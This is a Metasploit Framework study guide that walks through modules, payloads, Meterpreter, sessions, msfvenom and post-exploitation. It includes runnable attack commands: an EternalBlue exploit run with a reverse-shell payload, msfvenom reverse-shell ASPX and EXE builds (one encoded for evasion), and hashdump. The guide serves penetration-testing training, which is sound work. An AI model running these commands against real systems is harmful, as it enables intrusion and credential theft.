# Metasploit Framework

---

## Executive Summary

The **Metasploit Framework (MSF)** is a modular penetration testing platform used for exploitation, payload delivery, post-exploitation, and assessment data management.

Metasploit is not a “magic exploit button.” Effective use depends on good reconnaissance, correct module selection, proper payload configuration, and careful session management. The framework is built around modules such as exploits, auxiliary scanners, post-exploitation scripts, payloads, encoders, and listeners.

---

## 1. Core Metasploit Concepts

Metasploit modules follow a structured naming pattern that describes their purpose, platform, service, and exploit name.

Example module path:

```text
exploit/windows/smb/ms17_010_eternalblue
```

General structure:

```text
<type>/<platform>/<service>/<module_name>
```

### Main Module Types

| Type | Purpose |
|---|---|
| **Exploit** | Code that abuses a vulnerability to gain access or execute a payload. |
| **Auxiliary** | Scanners, fuzzers, sniffers, and enumeration tools that usually do not deliver payloads. |
| **Post** | Post-exploitation modules used after a session is obtained. |
| **Payload** | Code that runs on the target after successful exploitation. |
| **Encoder** | Modifies payload bytes, usually to remove bad characters or adjust payload structure. |
| **NOP** | Generates no-operation instructions used in some exploit development contexts. |

---

## 2. Searching for Modules

Metasploit contains thousands of modules, so searching efficiently is important.

```bash
msf6 > search eternalblue
```

Searches can be filtered by type, platform, CVE, or rank.

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent
```

Useful search filters include:

| Filter | Example |
|---|---|
| `type:` | `type:exploit` |
| `platform:` | `platform:windows` |
| `cve:` | `cve:2017` |
| `rank:` | `rank:excellent` |
| `name:` | `name:smb` |

After finding a module, load it with `use`.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

You can also load by result number.

```bash
msf6 > use 0
```

---

## 3. Module Configuration Workflow

After selecting a module, inspect its required options.

```bash
msf6 exploit(...) > show options
```

Useful commands:

| Command | Purpose |
|---|---|
| `show options` | Show required and optional module settings. |
| `info` | Display module description, references, targets, and notes. |
| `set OPTION VALUE` | Set an option for the current module. |
| `setg OPTION VALUE` | Set a global option across modules. |
| `unset OPTION` | Remove a value. |
| `unsetg OPTION` | Remove a global value. |
| `run` / `exploit` | Execute the module. |

Common options:

| Option | Meaning |
|---|---|
| `RHOSTS` | Remote target host or hosts. |
| `RPORT` | Remote target port. |
| `LHOST` | Local attacker IP address for reverse connections. |
| `LPORT` | Local attacker listening port. |
| `TARGETURI` | Base path of a web application. |
| `SSL` | Whether to use HTTPS/TLS. |
| `USERNAME` | Username for authenticated modules. |
| `PASSWORD` | Password for authenticated modules. |

Example:

```bash
msf6 exploit(...) > set RHOSTS 10.10.10.40
msf6 exploit(...) > set LHOST 10.10.14.15
msf6 exploit(...) > run
```

---

## 4. Targets

A **target** tells an exploit module which operating system, application version, or memory layout to use.

Some exploits need different offsets or payload techniques depending on the target version.

View available targets:

```bash
msf6 exploit(...) > show targets
```

Example output:

```text
Exploit targets:
   Id  Name
   --  ----
   0   Automatic
   1   Windows XP SP3
   2   Windows 7
   3   Windows Server 2008
```

Set a specific target:

```bash
msf6 exploit(...) > set TARGET 2
```

### Automatic vs Manual Targeting

| Mode | Description |
|---|---|
| **Automatic** | Metasploit attempts to fingerprint the target and choose the correct option. |
| **Manual** | The operator chooses the exact target based on reconnaissance. |

Manual targeting can be more reliable when enumeration has already confirmed the exact OS or application version.

---

## 5. Payloads

The **exploit** opens the door. The **payload** is what runs after the door opens.

Examples:

```text
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
php/meterpreter_reverse_tcp
cmd/unix/reverse_bash
```

### Single vs Staged Payloads

Metasploit payload naming uses slashes to indicate structure.

| Payload Type | Example | Description |
|---|---|---|
| **Single** | `windows/shell_reverse_tcp` | Full payload delivered at once. |
| **Staged** | `windows/shell/reverse_tcp` | Small stager connects back and downloads the full stage. |

### Staged Payload Workflow

1. Exploit sends a small **stager**.
2. Stager connects back to the attacker.
3. Metasploit sends the larger payload stage.
4. The full session opens.

Staged payloads are useful when exploit space is limited, but they require stable network connectivity.

---

## 6. Meterpreter

**Meterpreter** is Metasploit’s advanced payload. It runs in memory and provides a powerful post-exploitation interface.

Useful Meterpreter commands:

| Command | Purpose |
|---|---|
| `sysinfo` | Show OS and architecture information. |
| `getuid` | Show the user context of the session. |
| `shell` | Drop into a standard system shell. |
| `upload` | Upload a file to the target. |
| `download` | Download a file from the target. |
| `hashdump` | Dump local Windows password hashes when privileges allow. |
| `screenshot` | Capture a screenshot of the user’s desktop. |
| `background` | Send the session to the background. |

Example:

```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
```

---

## 7. Sessions

A **session** is an active connection to a compromised target.

List active sessions:

```bash
msf6 > sessions
```

Interact with a session:

```bash
msf6 > sessions -i 1
```

Background a session:

```bash
meterpreter > background
```

Or press:

```text
CTRL + Z
```

Session management commands:

| Command | Purpose |
|---|---|
| `sessions` | List active sessions. |
| `sessions -i <id>` | Interact with a session. |
| `sessions -u <id>` | Attempt to upgrade a shell to Meterpreter. |
| `sessions -k <id>` | Kill a session. |
| `background` | Return to `msfconsole` without killing the session. |

Post-exploitation modules usually require a session ID.

```bash
msf6 post(...) > set SESSION 1
msf6 post(...) > run
```

---

## 8. Jobs

A **job** is a background task running inside Metasploit. Jobs are commonly used for listeners, handlers, and long-running modules.

Run a module as a background job:

```bash
msf6 exploit(...) > run -j
```

List jobs:

```bash
msf6 > jobs -l
```

Kill a job:

```bash
msf6 > jobs -k 0
```

Kill all jobs:

```bash
msf6 > jobs -K
```

### Sessions vs Jobs

| Feature | Session | Job |
|---|---|---|
| Meaning | Active connection to a target. | Background process in Metasploit. |
| Example | Meterpreter shell. | Reverse handler waiting for connections. |
| Main command | `sessions` | `jobs` |

---

## 9. Multi Handler

The `multi/handler` module catches payloads generated outside a normal exploit flow, such as payloads created with `msfvenom`.

Start a handler:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

The handler payload settings must match the payload generated or delivered to the target.

---

## 10. MSFVenom

**MSFVenom** is Metasploit’s standalone payload generator. It replaced the older `msfpayload` and `msfencode` tools.

General syntax:

```bash
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> -f <format> -o <output_file>
```

Example ASPX payload for a Windows IIS target:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -o reverse_shell.aspx
```

Common options:

| Option | Purpose |
|---|---|
| `-p` | Payload. |
| `LHOST` | Attacker IP address. |
| `LPORT` | Attacker listening port. |
| `-f` | Output format. |
| `-o` | Output file. |
| `-a` | Architecture. |
| `--platform` | Target platform. |
| `-b` | Bad characters to avoid. |
| `-e` | Encoder. |
| `-i` | Encoding iterations. |

Common formats:

| Format | Use Case |
|---|---|
| `exe` | Windows executable. |
| `elf` | Linux executable. |
| `aspx` | ASP.NET/IIS payload. |
| `war` | Java web application archive. |
| `php` | PHP web payload. |
| `raw` | Raw shellcode. |

---

## 11. Encoders

Encoders modify payload bytes.

They are mainly used for:

1. Removing bad characters.
2. Matching architecture requirements.
3. Changing payload structure.

Historically, encoders were also used for antivirus evasion. Modern AV and EDR tools usually detect encoded payloads through behavior, heuristics, or known decoder stubs.

Example using Shikata Ga Nai:

```bash
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o payload.exe
```

View compatible encoders inside a module:

```bash
msf6 exploit(...) > show encoders
```

---

## 12. Metasploit Database

Metasploit can use **PostgreSQL** to store hosts, services, credentials, loot, and scan results.

Start PostgreSQL:

```bash
sudo systemctl start postgresql
```

Initialize the Metasploit database:

```bash
sudo msfdb init
```

Check database status:

```bash
msf6 > db_status
```

Expected result:

```text
[*] Connected to msf. Connection type: postgresql.
```

### Workspaces

Workspaces separate data between labs, clients, or engagements.

| Command | Purpose |
|---|---|
| `workspace` | List workspaces. |
| `workspace -a <name>` | Add a workspace. |
| `workspace <name>` | Switch workspace. |
| `workspace -d <name>` | Delete workspace. |

Example:

```bash
msf6 > workspace -a lab-network
msf6 > workspace lab-network
```

### Importing Nmap Results

Import an XML scan:

```bash
msf6 > db_import scan.xml
```

Run Nmap directly inside Metasploit:

```bash
msf6 > db_nmap -sV -sS 10.10.10.40
```

View stored hosts:

```bash
msf6 > hosts
```

View stored services:

```bash
msf6 > services
```

Set `RHOSTS` from database results:

```bash
msf6 > services -p 445 -R
```

View stored credentials:

```bash
msf6 > creds
```

View collected loot:

```bash
msf6 > loot
```

Export database data:

```bash
msf6 > db_export -f xml backup.xml
```

---

## 13. Importing Custom Modules

Sometimes an exploit exists outside the installed Metasploit module library. If it is already written as a Metasploit Ruby module, it can be imported manually.

Search for Metasploit-compatible exploits:

```bash
searchsploit -t Nagios3 --exclude=".py"
```

Custom user modules should usually be placed under:

```text
~/.msf4/modules/
```

Example:

```bash
mkdir -p ~/.msf4/modules/exploits/unix/webapp/
cp nagios3_command_injection.rb ~/.msf4/modules/exploits/unix/webapp/
```

Load new modules:

```bash
msf6 > reload_all
```

Or load a custom path:

```bash
msf6 > loadpath ~/.msf4/modules/
```

Use the imported module:

```bash
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

### Naming Notes

Use clean snake_case names for custom modules.

Good:

```text
nagios3_command_injection.rb
```

Avoid:

```text
9861.rb
Nagios-Exploit.rb
```

---

## 14. Anatomy of a Metasploit Module

Metasploit modules are written in Ruby and usually contain three important areas.

### Mixins

Mixins add capabilities to the module.

Examples:

```ruby
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
```

### Metadata

The `initialize` method defines module information.

```ruby
def initialize(info = {})
  super(update_info(info,
    'Name' => 'Example Web Exploit',
    'Description' => %q{
      This module exploits an example web vulnerability.
    },
    'Author' => ['Researcher'],
    'Platform' => 'php',
    'Targets' => [
      ['Automatic', {}]
    ],
    'DefaultTarget' => 0
  ))
end
```

### Options

Modules register options that the user must configure.

```ruby
register_options(
  [
    OptString.new('TARGETURI', [true, 'Base path', '/']),
    OptString.new('USERNAME', [true, 'Username']),
    OptString.new('PASSWORD', [true, 'Password'])
  ]
)
```

---

## 15. Local Exploit Suggester

After gaining a low-privileged session, Metasploit can suggest possible local privilege escalation modules.

Background the session:

```bash
meterpreter > background
```

Load the suggester:

```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run
```

If a suggested exploit appears viable, load it and point it at the active session.

```bash
msf6 > use exploit/windows/local/example_privesc
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > run
```

---

## 16. Firewall, IDS, IPS, and Endpoint Considerations

Security controls may block or detect Metasploit activity.

### Common Defensive Layers

| Layer | Examples |
|---|---|
| **Endpoint Protection** | Antivirus, EDR, host firewall, antimalware. |
| **Perimeter Protection** | Firewalls, IDS, IPS, DMZ segmentation. |
| **Security Policies** | Allow/deny rules for traffic, users, applications, and files. |

### Detection Approaches

| Type | Description |
|---|---|
| **Signature-based** | Looks for known byte patterns or attack signatures. |
| **Heuristic / anomaly-based** | Detects suspicious behavior compared to normal activity. |
| **Stateful protocol analysis** | Checks whether traffic follows expected protocol behavior. |

### Practical Considerations

Modern security tools usually detect default Metasploit payloads quickly. Encoding alone is not reliable for evasion. Defensive products may detect:

- Known payload signatures.
- Suspicious process behavior.
- Reverse shell network patterns.
- In-memory Meterpreter behavior.
- Decoder stubs from common encoders.
- Abnormal parent-child process chains.

For legitimate lab work, this means payload testing should be isolated, authorized, and performed only in controlled environments.

---

## 17. Example Workflow

A typical Metasploit workflow looks like this:

```bash
# 1. Start Metasploit
msfconsole

# 2. Search for a module
search smb eternalblue

# 3. Select the module
use exploit/windows/smb/ms17_010_eternalblue

# 4. Review information and options
info
show options

# 5. Set target and payload options
set RHOSTS 10.10.10.40
set LHOST 10.10.14.15
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Run the exploit
run

# 7. Verify session
getuid
sysinfo

# 8. Background the session
background

# 9. Run post-exploitation modules
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Quick Command Reference

| Task | Command |
|---|---|
| Search modules | `search <term>` |
| Use module | `use <module>` |
| Show options | `show options` |
| Show payloads | `show payloads` |
| Show targets | `show targets` |
| Set option | `set OPTION VALUE` |
| Set global option | `setg OPTION VALUE` |
| Run module | `run` |
| Run as job | `run -j` |
| List sessions | `sessions` |
| Interact with session | `sessions -i <id>` |
| Background session | `background` |
| List jobs | `jobs -l` |
| Kill job | `jobs -k <id>` |
| Database status | `db_status` |
| List hosts | `hosts` |
| List services | `services` |
| List credentials | `creds` |
| List loot | `loot` |

---

## Key Takeaways

- Metasploit is a modular framework, not a replacement for reconnaissance.
- Exploits and payloads are separate components.
- Correct `RHOSTS`, `LHOST`, payload, and target settings are critical.
- Meterpreter provides advanced post-exploitation capabilities.
- Sessions are victim connections; jobs are background MSF processes.
- The PostgreSQL database helps organize large engagements.
- MSFVenom is used to generate standalone payloads.
- Default payloads and simple encoders are commonly detected by modern defenses.